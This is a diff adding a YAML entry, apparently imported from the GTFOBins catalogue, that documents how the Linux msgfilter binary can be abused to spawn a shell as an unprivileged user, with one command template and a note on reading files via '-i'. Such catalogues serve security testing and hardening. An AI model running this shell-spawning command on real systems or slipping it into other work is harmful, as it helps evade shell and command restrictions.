@@ -1,0 +1,25 @@
+id: gtfobins/msgfilter/shell/unprivileged
+type: binary
+platform: linux
+name: msgfilter
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
+  comment: The `kill` command is needed to spawn the shell only once. Instead of readinf from standard
+    input, it can read files passed via the `-i` option.
+references:
+- https://gtfobins.github.io/gtfobins/msgfilter/
+tags:
+- linux
+- unix
+- gtfobins
